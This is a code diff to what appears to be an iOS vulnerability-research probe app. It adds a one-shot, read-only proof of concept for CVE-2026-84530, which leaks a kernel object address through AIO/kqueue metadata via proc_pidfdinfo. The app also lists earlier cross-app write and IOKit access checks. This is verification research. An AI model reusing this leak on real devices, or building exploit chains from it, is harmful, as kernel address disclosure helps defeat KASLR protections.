@@ -579,6 +579,190 @@ typedef NS_ENUM(NSInteger, HIDTestMode) {
 @end
 
 
+
+/*
+ * CVE-2026-84530 AIO/kqueue metadata disclosure, one-shot read-only check.
+ * Original research: vschko/CaseStudies/CVE-2026-84530.
+ * This creates only an app-owned FIFO and asks for metadata on THIS process's
+ * kqueue. It does not invoke malformed selectors, races or kernel writes.
+ * A high address in the AIO saved-data field is evidence of the disclosure;
+ * absence is a meaningful negative, not a reason to repeat crash tests.
+ */
+#import <aio.h>
+#import <sys/event.h>
+#import <sys/stat.h>
+#import <fcntl.h>
+#import <unistd.h>
+#import <errno.h>
+#import <dlfcn.h>
+
+struct ProbeAIOEvent {
+    uint64_t ident; int16_t filter; uint16_t flags; int32_t qos;
+    uint64_t udata; uint32_t fflags, xflags; int64_t data; uint64_t ext[4];
+};
+struct ProbeAIOExtInfo {
+    struct ProbeAIOEvent event;
+    uint64_t savedData;
+    int32_t status, savedFlags;
+    uint64_t reserved[2];
+};
+typedef int (*ProbePidFdInfo)(int, int, int, void *, int);
+
+@interface AIODisclosureController : UIViewController
+@property(nonatomic,strong) UITextView *logView;
+@property(nonatomic,strong) UIButton *runButton;
+@end
+@implementation AIODisclosureController
+- (void)viewDidLoad {
+    [super viewDidLoad];
+    self.title = @"AIO Kernel Address";
+    self.view.backgroundColor = UIColor.systemBackgroundColor;
+    UILabel *message = [UILabel new];
+    message.translatesAutoresizingMaskIntoConstraints = NO;
+    message.numberOfLines = 0;
+    message.font = [UIFont preferredFontForTextStyle:UIFontTextStyleSubheadline];
+    message.text = @"CVE-2026-84530: a one-shot read-only test for an AIO "
+      "kernel-object address unintentionally exposed through kqueue metadata. "
+      "No kernel memory writes, crashes, or SpringBoard edits. "
+      "A successful leak is NOT arbitrary kernel memory read/write.";
+    self.runButton = [UIButton buttonWithType:UIButtonTypeSystem];
+    self.runButton.translatesAutoresizingMaskIntoConstraints = NO;
+    [self.runButton setTitle:@"Run AIO metadata test once"
+                    forState:UIControlStateNormal];
+    [self.runButton addTarget:self action:@selector(runOnce:)
+             forControlEvents:UIControlEventTouchUpInside];
+    UIButton *copy = [UIButton buttonWithType:UIButtonTypeSystem];
+    copy.translatesAutoresizingMaskIntoConstraints = NO;
+    [copy setTitle:@"Copy results" forState:UIControlStateNormal];
+    [copy addTarget:self action:@selector(copyResults:)
+    forControlEvents:UIControlEventTouchUpInside];
+    self.logView = [UITextView new];
+    self.logView.translatesAutoresizingMaskIntoConstraints = NO;
+    self.logView.editable = NO;
+    self.logView.selectable = YES;
+    self.logView.backgroundColor = UIColor.secondarySystemBackgroundColor;
+    self.logView.layer.cornerRadius = 10;
+    self.logView.font = [UIFont monospacedSystemFontOfSize:12
+                                             weight:UIFontWeightRegular];
+    self.logView.text = @"Not run. Operates on one app-owned FIFO and this process only.";
+    [self.view addSubview:message];
+    [self.view addSubview:self.runButton];
+    [self.view addSubview:copy];
+    [self.view addSubview:self.logView];
+    UILayoutGuide *g = self.view.safeAreaLayoutGuide;
+    [NSLayoutConstraint activateConstraints:@[
+      [message.topAnchor constraintEqualToAnchor:g.topAnchor constant:12],
+      [message.leadingAnchor constraintEqualToAnchor:g.leadingAnchor constant:16],
+      [message.trailingAnchor constraintEqualToAnchor:g.trailingAnchor constant:-16],
+      [self.runButton.topAnchor constraintEqualToAnchor:message.bottomAnchor constant:18],
+      [self.runButton.leadingAnchor constraintEqualToAnchor:message.leadingAnchor],
+      [copy.centerYAnchor constraintEqualToAnchor:self.runButton.centerYAnchor],
+      [copy.trailingAnchor constraintEqualToAnchor:message.trailingAnchor],
+      [self.logView.topAnchor constraintEqualToAnchor:self.runButton.bottomAnchor constant:12],
+      [self.logView.leadingAnchor constraintEqualToAnchor:message.leadingAnchor],
+      [self.logView.trailingAnchor constraintEqualToAnchor:message.trailingAnchor],
+      [self.logView.bottomAnchor constraintEqualToAnchor:g.bottomAnchor constant:-12]
+    ]];
+}
+- (void)copyResults:(id)sender {
+    UIPasteboard.generalPasteboard.string = self.logView.text ?: @"";
+}
+- (void)runOnce:(id)sender {
+    if (!self.runButton.enabled) return;
+    self.runButton.enabled = NO;
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED,0), ^{
+        NSString *result = [self runDisclosure];
+        dispatch_async(dispatch_get_main_queue(), ^{
+            self.logView.text = result;
+            // Intentionally one-shot per page visit.
+        });
+    });
+}
+- (NSString *)runDisclosure {
+    NSMutableString *log = [NSMutableString stringWithFormat:
+       @"AIO metadata read-only test\nOS %@\n", UIDevice.currentDevice.systemVersion];
+    ProbePidFdInfo info = (ProbePidFdInfo)dlsym(RTLD_DEFAULT,"proc_pidfdinfo");
+    if (!info) return [log stringByAppendingString:@"UNAVAILABLE: proc_pidfdinfo is not exported."];
+    int kq = kqueue();
+    if (kq < 0) return [log stringByAppendingFormat:@"kqueue error: %d",errno];
+    NSString *name = [NSString stringWithFormat:@"aio-%@.fifo",NSUUID.UUID.UUIDString];
+    NSString *file = [NSTemporaryDirectory() stringByAppendingPathComponent:name];
+    const char *path = file.fileSystemRepresentation;
+    int fd = -1, writer = -1, err = 0;
+    struct aiocb *cb = NULL;
+    if (mkfifo(path,0600) != 0) {
+        [log appendFormat:@"mkfifo errno=%d",errno];
+        goto cleanup;
+    }
+    fd = open(path,O_RDONLY | O_NONBLOCK);
+    if (fd < 0) { [log appendFormat:@"FIFO read open errno=%d",errno]; goto cleanup; }
+    writer = open(path,O_WRONLY | O_NONBLOCK);
+    if (writer < 0) { [log appendFormat:@"FIFO write open errno=%d",errno]; goto cleanup; }
+    int flags = fcntl(fd,F_GETFL);
+    if (flags >= 0) fcntl(fd,F_SETFL,flags & ~O_NONBLOCK);
+    cb = calloc(1,sizeof(*cb));
+    if (!cb) { [log appendString:@"No memory for AIO control block"]; goto cleanup; }
+    void *buf = calloc(1,32);
+    if (!buf) { [log appendString:@"No memory for AIO buffer"]; goto cleanup; }
+    cb->aio_fildes=fd;
+    cb->aio_buf=buf;
+    cb->aio_nbytes=32;
+    cb->aio_sigevent.sigev_notify=SIGEV_KEVENT;
+    cb->aio_sigevent.sigev_signo=kq;
+    if (aio_read(cb) != 0) {
+        err = errno;
+        [log appendFormat:@"aio_read unavailable, errno=%d",err];
+        free(buf); free(cb); cb=NULL;
+        goto cleanup;
+    }
+    BOOL found = NO;
+    for (int attempt=0; attempt<12 && !found; attempt++) {
+        struct ProbeAIOExtInfo records[16] = {0};
+        errno=0;
+        int amount = info(getpid(),kq,9,records,(int)sizeof(records));
+        if (amount < 0) {
+            [log appendFormat:@"proc_pidfdinfo denied/failed errno=%d",errno];
+            break;
+        }
+        NSUInteger count = MIN((NSUInteger)16,
+            (NSUInteger)(amount > 16 ? amount/sizeof(records[0]) : amount));
+        for (NSUInteger i=0; i<count; i++) {
+            uint64_t value = records[i].savedData;
+            if (records[i].event.filter == EVFILT_AIO &&
+                value >= 0xffff000000000000ULL) {
+                [log appendFormat:@"PASS: AIO saved-data kernel address 0x%016llx; event data=%lld\n",
+                    (unsigned long long)value,(long long)records[i].event.data];
+                found=YES;
+                break;
+            }
+        }
+        if (!found) usleep(20000);
+    }
+    if (!found) [log appendString:@"NOT VERIFIED: No kernel-looking AIO saved-data returned.\n"];
+    // Complete only this application's own pending FIFO operation.
+    uint8_t payload[32] = {0};
+    (void)write(writer,payload,sizeof(payload));
+    for (int tries=0;tries<50;tries++) {
+        int state=aio_error(cb);
+        if (state!=EINPROGRESS) break;
+        usleep(10000);
+    }
+    int state=aio_error(cb);
+    if (state!=EINPROGRESS) {
+        (void)aio_return(cb);
+        free(buf); free(cb); cb=NULL;
+    } else {
+        [log appendString:@"AIO still pending; retaining control block until process exit.\n"];
+    }
+cleanup:
+    if (fd>=0) close(fd);
+    if (writer>=0) close(writer);
+    close(kq);
+    unlink(path);
+    return log;
+}
+@end
+
 @interface ProbeHomeController : UITableViewController
 @end
 @implementation ProbeHomeController
@@ -593,10 +777,10 @@ typedef NS_ENUM(NSInteger, HIDTestMode) {
     self.tableView.estimatedRowHeight = 60;
 }
 - (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView {
-    return 3;
+    return 4;
 }
 - (NSString *)tableView:(UITableView *)tableView titleForHeaderInSection:(NSInteger)section {
-    return @[@"App data", @"HID / IOHIDFamily", @"Kernel services"][section];
+    return @[@"App data", @"HID / IOHIDFamily", @"Kernel services", @"Kernel information leaks"][section];
 }
 - (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
     return section == 0 ? 1 : (section == 1 ? 4 : 1);
@@ -604,6 +788,7 @@ typedef NS_ENUM(NSInteger, HIDTestMode) {
 - (NSString *)nameAt:(NSIndexPath *)indexPath {
     if (indexPath.section == 0) return @"Erosion file-change validation";
     if (indexPath.section == 2) return @"AppleAVE2 and service opens";
+    if (indexPath.section == 3) return @"AIO kqueue CVE-2026-84530";
     return @[@"HID service reachability",
              @"HID provider inventory",
              @"HID manager class opens",
@@ -612,6 +797,7 @@ typedef NS_ENUM(NSInteger, HIDTestMode) {
 - (NSString *)noteAt:(NSIndexPath *)indexPath {
     if (indexPath.section == 0) return @"Existing cross-app data-file write validation";
     if (indexPath.section == 2) return @"One-time service access checks";
+    if (indexPath.section == 3) return @"Actual kernel-address disclosure, read-only";
     return @[@"Registered services; manager connection",
              @"Registry only — no connection opens",
              @"Standard HID manager client opens",
@@ -634,6 +820,8 @@ typedef NS_ENUM(NSInteger, HIDTestMode) {
         page = [ContainerChangeController new];
     } else if (indexPath.section == 2) {
         page = [ProbeController new];
+    } else if (indexPath.section == 3) {
+        page = [AIODisclosureController new];
     } else {
         page = [[HIDReachabilityController alloc] initWithTestMode:(HIDTestMode)indexPath.row];
     }
@@ -644,7 +832,8 @@ typedef NS_ENUM(NSInteger, HIDTestMode) {
         return @"An Erosion write to the probe's own Documents file was already verified. This page does not grant cross-app access itself.";
     if (section == 1)
         return @"These are historical research checks, not kernel memory access. No tests run automatically.";
-    return @"Do not repeat completed access checks without a new question to test.";
+    if (section == 2) return @"Do not repeat completed access checks without a new question to test.";
+    return @"CVE-2026-84530 is a kernel-address leak, not arbitrary memory access or code execution. No stress loops.";
 }
 @end
 
